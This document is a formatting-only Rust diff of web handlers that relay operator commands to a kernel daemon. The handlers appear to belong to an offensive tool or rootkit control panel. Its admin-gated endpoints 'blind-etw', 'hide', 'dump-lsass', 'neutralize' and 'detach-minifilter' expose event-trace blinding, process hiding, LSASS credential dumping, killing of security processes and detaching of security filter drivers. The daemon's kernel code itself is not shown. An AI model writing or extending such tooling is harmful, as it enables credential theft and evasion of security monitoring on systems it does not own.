@@ -38,7 +38,10 @@ pub struct KernelBridge {
 
 impl KernelBridge {
     pub fn new(config: KernelConfig) -> Self {
-        Self { addr: config.addr, conn: Mutex::new(None) }
+        Self {
+            addr: config.addr,
+            conn: Mutex::new(None),
+        }
     }
 
     pub fn is_configured(&self) -> bool {
@@ -54,25 +57,34 @@ impl KernelBridge {
 
         let mut guard = self.conn.lock().map_err(|e| format!("lock: {e}"))?;
         if guard.is_none() {
-            let s = TcpStream::connect(&self.addr)
-                .map_err(|e| format!("daemon {}: {e}", self.addr))?;
-            s.set_read_timeout(Some(std::time::Duration::from_secs(30))).ok();
+            let s =
+                TcpStream::connect(&self.addr).map_err(|e| format!("daemon {}: {e}", self.addr))?;
+            s.set_read_timeout(Some(std::time::Duration::from_secs(30)))
+                .ok();
             *guard = Some(s);
         }
         let stream = guard.as_mut().unwrap();
-        stream.write_all(request.as_bytes()).map_err(|e| format!("write: {e}"))?;
+        stream
+            .write_all(request.as_bytes())
+            .map_err(|e| format!("write: {e}"))?;
         stream.flush().map_err(|e| format!("flush: {e}"))?;
 
         let mut r = BufReader::new(stream.try_clone().map_err(|e| format!("clone: {e}"))?);
         let mut line = String::new();
         r.read_line(&mut line).map_err(|e| format!("read: {e}"))?;
-        if line.is_empty() { *guard = None; return Err("daemon closed".into()); }
+        if line.is_empty() {
+            *guard = None;
+            return Err("daemon closed".into());
+        }
         serde_json::from_str(&line).map_err(|e| format!("parse: {e}"))
     }
 }
 
 // ---- Auth helper ----
-fn gate(st: &crate::AppState, headers: &HeaderMap) -> Result<operators::OperatorIdentity, Response> {
+fn gate(
+    st: &crate::AppState,
+    headers: &HeaderMap,
+) -> Result<operators::OperatorIdentity, Response> {
     match crate::authenticate(st, headers) {
         crate::AuthOutcome::Allowed(op) => {
             if op.role != operators::Role::Admin {
@@ -86,9 +98,14 @@ fn gate(st: &crate::AppState, headers: &HeaderMap) -> Result<operators::Operator
 
 // ---- Query params ----
 #[derive(Deserialize)]
-pub struct PidQ { pub pid: u32 }
+pub struct PidQ {
+    pub pid: u32,
+}
 #[derive(Deserialize)]
-pub struct NeutQ { pub pid: u32, pub method: Option<String> }
+pub struct NeutQ {
+    pub pid: u32,
+    pub method: Option<String>,
+}
 
 // ---- Handlers ----
 
@@ -96,10 +113,16 @@ pub async fn driver_status(
     State(st): State<std::sync::Arc<crate::AppState>>,
     headers: HeaderMap,
 ) -> Response {
-    let _ = match gate(&st, &headers) { Ok(o) => o, Err(r) => return r };
+    let _ = match gate(&st, &headers) {
+        Ok(o) => o,
+        Err(r) => return r,
+    };
     let bridge = match &st.kernel {
         Some(b) => b,
-        None => return Json(serde_json::json!({"ok":false,"err":"kernel daemon not configured"})).into_response(),
+        None => {
+            return Json(serde_json::json!({"ok":false,"err":"kernel daemon not configured"}))
+                .into_response()
+        }
     };
     match bridge.send_op("ping", None) {
         Ok(_) => Json(serde_json::json!({"ok":true,"status":"connected"})).into_response(),
@@ -108,10 +131,17 @@ pub async fn driver_status(
 }
 
 pub async fn blind_etw(
-    State(st): State<std::sync::Arc<crate::AppState>>, headers: HeaderMap,
+    State(st): State<std::sync::Arc<crate::AppState>>,
+    headers: HeaderMap,
 ) -> Response {
-    let _ = match gate(&st, &headers) { Ok(o) => o, Err(r) => return r };
-    let bridge = match &st.kernel { Some(b) => b, None => return Json(serde_json::json!({"ok":false,"err":"no daemon"})).into_response() };
+    let _ = match gate(&st, &headers) {
+        Ok(o) => o,
+        Err(r) => return r,
+    };
+    let bridge = match &st.kernel {
+        Some(b) => b,
+        None => return Json(serde_json::json!({"ok":false,"err":"no daemon"})).into_response(),
+    };
     match bridge.send_op("blind-etw", None) {
         Ok(v) => Json(v).into_response(),
         Err(e) => Json(serde_json::json!({"ok":false,"err":e})).into_response(),
@@ -119,10 +149,18 @@ pub async fn blind_etw(
 }
 
 pub async fn hide(
-    State(st): State<std::sync::Arc<crate::AppState>>, headers: HeaderMap, Query(q): Query<PidQ>,
+    State(st): State<std::sync::Arc<crate::AppState>>,
+    headers: HeaderMap,
+    Query(q): Query<PidQ>,
 ) -> Response {
-    let _ = match gate(&st, &headers) { Ok(o) => o, Err(r) => return r };
-    let bridge = match &st.kernel { Some(b) => b, None => return Json(serde_json::json!({"ok":false,"err":"no daemon"})).into_response() };
+    let _ = match gate(&st, &headers) {
+        Ok(o) => o,
+        Err(r) => return r,
+    };
+    let bridge = match &st.kernel {
+        Some(b) => b,
+        None => return Json(serde_json::json!({"ok":false,"err":"no daemon"})).into_response(),
+    };
     match bridge.send_op("hide", Some(q.pid)) {
         Ok(v) => Json(v).into_response(),
         Err(e) => Json(serde_json::json!({"ok":false,"err":e})).into_response(),
@@ -130,10 +168,18 @@ pub async fn hide(
 }
 
 pub async fn dump_lsass(
-    State(st): State<std::sync::Arc<crate::AppState>>, headers: HeaderMap, Query(q): Query<PidQ>,
+    State(st): State<std::sync::Arc<crate::AppState>>,
+    headers: HeaderMap,
+    Query(q): Query<PidQ>,
 ) -> Response {
-    let _ = match gate(&st, &headers) { Ok(o) => o, Err(r) => return r };
-    let bridge = match &st.kernel { Some(b) => b, None => return Json(serde_json::json!({"ok":false,"err":"no daemon"})).into_response() };
+    let _ = match gate(&st, &headers) {
+        Ok(o) => o,
+        Err(r) => return r,
+    };
+    let bridge = match &st.kernel {
+        Some(b) => b,
+        None => return Json(serde_json::json!({"ok":false,"err":"no daemon"})).into_response(),
+    };
     match bridge.send_op("dump-lsass", Some(q.pid)) {
         Ok(v) => Json(v).into_response(),
         Err(e) => Json(serde_json::json!({"ok":false,"err":e})).into_response(),
@@ -141,10 +187,18 @@ pub async fn dump_lsass(
 }
 
 pub async fn neutralize(
-    State(st): State<std::sync::Arc<crate::AppState>>, headers: HeaderMap, Query(q): Query<NeutQ>,
+    State(st): State<std::sync::Arc<crate::AppState>>,
+    headers: HeaderMap,
+    Query(q): Query<NeutQ>,
 ) -> Response {
-    let _ = match gate(&st, &headers) { Ok(o) => o, Err(r) => return r };
-    let bridge = match &st.kernel { Some(b) => b, None => return Json(serde_json::json!({"ok":false,"err":"no daemon"})).into_response() };
+    let _ = match gate(&st, &headers) {
+        Ok(o) => o,
+        Err(r) => return r,
+    };
+    let bridge = match &st.kernel {
+        Some(b) => b,
+        None => return Json(serde_json::json!({"ok":false,"err":"no daemon"})).into_response(),
+    };
     match bridge.send_op("neutralize", Some(q.pid)) {
         Ok(v) => Json(v).into_response(),
         Err(e) => Json(serde_json::json!({"ok":false,"err":e})).into_response(),
@@ -152,10 +206,17 @@ pub async fn neutralize(
 }
 
 pub async fn detach_minifilter(
-    State(st): State<std::sync::Arc<crate::AppState>>, headers: HeaderMap,
+    State(st): State<std::sync::Arc<crate::AppState>>,
+    headers: HeaderMap,
 ) -> Response {
-    let _ = match gate(&st, &headers) { Ok(o) => o, Err(r) => return r };
-    let bridge = match &st.kernel { Some(b) => b, None => return Json(serde_json::json!({"ok":false,"err":"no daemon"})).into_response() };
+    let _ = match gate(&st, &headers) {
+        Ok(o) => o,
+        Err(r) => return r,
+    };
+    let bridge = match &st.kernel {
+        Some(b) => b,
+        None => return Json(serde_json::json!({"ok":false,"err":"no daemon"})).into_response(),
+    };
     match bridge.send_op("detach-minifilter", None) {
         Ok(v) => Json(v).into_response(),
         Err(e) => Json(serde_json::json!({"ok":false,"err":e})).into_response(),
